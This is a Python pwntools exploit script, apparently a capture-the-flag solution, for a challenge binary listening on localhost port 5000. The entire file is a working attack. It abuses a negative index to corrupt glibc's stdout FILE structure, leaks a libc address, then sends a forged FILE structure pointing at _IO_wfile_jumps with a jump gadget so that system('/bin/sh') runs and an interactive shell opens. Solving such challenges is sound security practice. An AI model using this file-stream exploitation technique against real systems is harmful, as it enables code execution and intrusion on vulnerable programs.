from pwn import *
context.log_level='debug'
elf = context.binary = ELF("./chal")
libc = ELF("./libc.so.6")

p = remote("127.0.0.1", 5000)
p.sendlineafter(b"> ", b"-32")
pay = [
    p64(0xfbad1887),
    p64(0) * 3,
    p8(0)
]
p.sendafter(b"> ", b''.join(pay))
p.recv(8)
leak = u64(p.recv(8))
print(f"leak = {hex(leak)}")
libc.address = leak - 0x1d4a00
print(f"libc @ {hex(libc.address)}")

p.sendlineafter(b"> ", b"-32")
gad = libc.address + 0x00000000001405dc # add rdi, 0x10 ; jmp rcx

file = FileStructure(0)
file.flags = 0x3b01010101010101
file._IO_read_end = libc.sym['system']
file._IO_save_base = gad
file._IO_write_end = u64(b'/bin/sh\x00')
# file._IO_write_end = u64(b'echo gg\x00')
file._lock = libc.address + 0x1d4a10
file._codecvt = libc.sym['_IO_2_1_stdout_'] + 0xb8
file._wide_data = libc.sym['_IO_2_1_stdout_'] + 0x200
file.unknown2 = p64(0) * 2 + p64(libc.sym['_IO_2_1_stdout_'] + 0x20) + p64(0) * 3 + p64(libc.sym['_IO_wfile_jumps'] - 0x18)
p.sendafter(b"> ", bytes(file))

p.interactive()
